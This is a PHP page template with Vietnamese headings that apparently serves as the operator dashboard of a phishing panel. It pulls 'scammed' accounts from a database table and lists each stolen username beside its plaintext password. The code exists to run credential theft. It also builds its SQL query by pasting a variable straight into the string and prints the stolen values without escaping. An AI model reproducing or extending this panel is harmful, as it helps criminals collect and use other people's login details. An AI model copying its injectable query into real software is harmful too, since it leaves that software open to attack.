<?php include('Theme/Header.php'); ?>

<div class="main_content_iner overly_inner ">
<div class="container-fluid p-0 ">

<div class="row">
<div class="col-12">
<div class="page_title_box d-flex flex-wrap align-items-center justify-content-between">
<div class="page_title_left d-flex align-items-center">
<h3 class="f_s_25 f_w_700 dark_text mr_30"> Tài Khoản Đã Scam Của Bạn </h3>
</div>
<div class="page_title_right">
<div class="page_date_button d-flex align-items-center">
Developer By Thành Right 
</div>
</div>
</div>
</div>
</div>
<div class="row">
<div class="col-lg-12">
<div class="white_card card_height_100 mb_30 pt-4">
<div class="white_card_body">
<div class="QA_section">
<div class="white_box_tittle list_header">
<h4> Tải Khoản & Mật Khẩu Đã Scam </h4>
<div class="box_right d-flex lms_block">
</div>
</div>
</div>
<div class="QA_table mb_30">

<table class="table lms_table_active ">
<thead>
<tr>
<th scope="col">id</th>
<th scope="col"> Tài Khoản </th>
<th scope="col"> Mật Khẩu </th>
</tr>
</thead>
<tbody>

    

	<?php
	$stt = 0;

		$result = mysqli_query($conn, "SELECT * FROM scam_account  WHERE uid = '$user_id'");
		while($scam = mysqli_fetch_assoc($result)){
		    $stt++;

			?>
    <tr>
<th scope="row"> <a href="#" class="question_content"> <?php echo $stt; ?> </a></th>
<td> <?php echo $scam['username']; ?></td>
<td> <?php echo $scam['password']; ?></td>

</tr>

<?php } ?>
</tr>
</tbody>
</table>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<?php include('Theme/Footer.php'); ?>